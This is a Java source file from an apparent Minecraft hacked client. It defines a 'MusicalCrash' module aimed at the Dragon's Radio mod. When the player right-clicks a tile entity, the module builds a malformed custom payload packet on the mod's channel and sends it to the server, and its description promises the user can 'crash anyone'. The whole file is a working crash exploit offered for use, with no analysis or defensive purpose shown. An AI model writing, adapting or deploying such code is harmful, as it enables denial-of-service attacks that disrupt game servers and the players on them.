package ehacks.mod.modulesystem.classes.mods.dragonsradio;

import ehacks.mod.api.ModStatus;
import ehacks.mod.api.Module;
import ehacks.mod.util.InteropUtils;
import ehacks.mod.wrapper.ModuleCategory;
import ehacks.mod.wrapper.Wrapper;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import net.minecraft.tileentity.TileEntity;
import net.minecraft.util.MovingObjectPosition;
import net.minecraftforge.client.event.MouseEvent;
import org.lwjgl.input.Mouse;

public class MusicalCrash
        extends Module {

    public MusicalCrash() {
        super(ModuleCategory.EHACKS);
    }

    @Override
    public String getName() {
        return "MusicalCrash";
    }

    @Override
    public String getDescription() {
        return "You can crash anyone using right click on TileEntity";
    }

    @Override
    public void onModuleEnabled() {
        try {
            Class.forName("eu.thesociety.DragonbornSR.DragonsRadioMod.Block.TileEntity.TileEntityRadio");
        } catch (Exception ex) {
            this.off();
        }
    }

    @Override
    public ModStatus getModStatus() {
        try {
            Class.forName("eu.thesociety.DragonbornSR.DragonsRadioMod.Block.TileEntity.TileEntityRadio");
            return ModStatus.WORKING;
        } catch (Exception e) {
            return ModStatus.NOTWORKING;
        }
    }

    private boolean prevState = false;

    @Override
    public void onMouse(MouseEvent event) {
        MovingObjectPosition mop = Wrapper.INSTANCE.mc().objectMouseOver;
        if (mop.sideHit == -1) {
            return;
        }
        boolean nowState = Mouse.isButtonDown(1);
        if (!prevState && nowState) {
            prevState = nowState;
            TileEntity entity = Wrapper.INSTANCE.world().getTileEntity(mop.blockX, mop.blockY, mop.blockZ);
            try {
                if (mop.typeOfHit == MovingObjectPosition.MovingObjectType.BLOCK && entity != null && !Class.forName("eu.thesociety.DragonbornSR.DragonsRadioMod.Block.TileEntity.TileEntityRadio").isInstance(entity)) {
                    ByteBuf buf = Unpooled.buffer(0);
                    buf.writeByte(0);
                    buf.writeInt(0);
                    buf.writeDouble(mop.blockX);
                    buf.writeDouble(mop.blockY);
                    buf.writeDouble(mop.blockZ);
                    buf.writeInt(Wrapper.INSTANCE.player().dimension);
                    buf.writeInt(0);
                    buf.writeBytes(new byte[0]);
                    buf.writeBoolean(false);
                    buf.writeFloat(0);
                    buf.writeDouble(0);
                    buf.writeDouble(0);
                    buf.writeDouble(0);
                    C17PacketCustomPayload packet = new C17PacketCustomPayload("DragonsRadioMod", buf);
                    Wrapper.INSTANCE.player().sendQueue.addToSendQueue(packet);
                    InteropUtils.log("Crash sent", this);
                    if (event.isCancelable()) {
                        event.setCanceled(true);
                    }
                }
            } catch (Exception ex) {
                InteropUtils.log("Error happened", this);
            }
        }
        prevState = nowState;
    }

    @Override
    public String getModName() {
        return "Dragon's radio";
    }
}
